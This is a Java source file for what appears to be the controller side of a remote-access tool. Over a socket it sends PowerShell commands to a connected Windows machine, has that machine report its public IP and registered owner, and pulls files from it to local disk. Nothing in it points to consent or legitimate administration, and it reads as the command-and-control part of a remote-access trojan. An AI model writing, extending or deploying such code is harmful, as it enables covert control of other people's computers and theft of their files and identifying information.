package connection;

import java.io.BufferedOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.Socket;

public class Connection {
	private Socket s;
	private DataOutputStream dout;
	private DataInputStream din;
	private String ip;
	
	public Connection(Socket socket) throws IOException {
		s = socket;
		
		din = new DataInputStream(s.getInputStream());
		dout = new DataOutputStream(s.getOutputStream());
		
		dout.writeUTF(" Invoke-RestMethod http://ipinfo.io/json | Select -exp ip");
		dout.flush();
		ip = din.readUTF();
	}
	
	public String send(String str) throws IOException {
		dout.writeUTF(str);
		dout.flush();
		
		return din.readUTF();
	}
	
	public String receive() throws IOException {
		return din.readUTF();
	}
	
	public void receive(String fileName) throws IOException {
		InputStream is;
		DataInputStream din;
		FileOutputStream out;
		BufferedOutputStream bos;
		 
		try {
			is = s.getInputStream();
		    din = new DataInputStream(is);
		    out = new FileOutputStream(new File(fileName));
		    bos = new BufferedOutputStream(out);
		} catch(IOException e) {
			System.out.println("There was a problem initializing the transfer, retrying...");
			throw e;
		}
		try {
		    //Client sends length of file
		    int length = Integer.valueOf(din.readUTF());
		    byte [] mybytearray  = new byte [length];
		    System.out.println("Receiving " + fileName + " (" + length + " bytes)");
		    
		    //is.read tries to read up to length, but may read less
		    int bytesRead = is.read(mybytearray, 0, length);
		    int current = bytesRead;
		    
		    while (current != length) {
		    	System.out.println(current + "/" + length);
		    	bytesRead = is.read(mybytearray, current, (length - current));
		    	if(bytesRead >= 0) {
		    		current += bytesRead;
		    	}
		    }
		    
		    System.out.println("File recieved");
		    
		    bos.write(mybytearray, 0 , length);
		    bos.flush();
		}catch(IOException e) {
			System.out.println("The transfer couldn't be completed");
		}
	    
	    is.close();
		out.close();
		bos.close();
	}
	
	public void end() throws IOException {
		dout.close();
		din.close();
		s.close();
	}
	
	public boolean connectionIsOpen() {
		return !s.isClosed();
	}
	
	public String getSysInfo() throws IOException {
		String sysInfo = "[not found]";
		
		sysInfo = "\n" + "Public ip: " + ip;
			
		dout.writeUTF(" Get-ComputerInfo | Select-Object WindowsRegisteredOwner, CsManufacturer, WindowsProductName, WindowsCurrentVersion | Format-List");
		dout.flush();
		sysInfo += din.readUTF();
		
		return sysInfo;
	}
	
	public String getIp() {
		return ip;
	}
}
